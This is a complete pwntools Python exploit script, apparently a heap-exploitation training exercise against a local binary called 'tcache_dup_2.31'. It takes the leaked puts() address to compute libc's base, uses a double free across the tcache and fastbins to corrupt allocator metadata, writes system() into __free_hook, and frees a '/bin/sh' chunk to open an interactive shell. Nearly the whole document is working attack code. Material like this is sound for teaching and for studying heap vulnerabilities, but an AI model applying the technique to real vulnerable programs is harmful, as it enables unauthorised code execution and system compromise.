#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("tcache_dup_2.31")
libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size & data.
# Returns chunk index.
def malloc(size, data):
    global index
    io.send(b"1")
    io.sendafter(b"size: ", f"{size}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")
    index += 1
    return index - 1

# Select the "free" option; send index.
def free(index):
    io.send(b"2")
    io.sendafter(b"index: ", f"{index}".encode())
    io.recvuntil(b"> ")

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.recvuntil(b"> ")
io.timeout = 0.1

# =============================================================================

# Request 7 0x20-sized chunks.
for n in range(7):
    malloc(24, b"Filler")

dup = malloc(24, b"dup")

# Fill the 0x20 tcachebin.
for n in range(7):
    free(n)

# Move chunk into fastbins
free(dup) 

# Empty tcache
for i in range(7):
    malloc(24, b"filler")

free(dup)

# Fill key with null
malloc(24, p64(libc.sym["__free_hook"] - 0x10))
dump = malloc(24, b"/bin/sh")

# Overwrite
malloc(24, p64(libc.sym["system"]))
free(dump)


# =============================================================================

io.interactive()
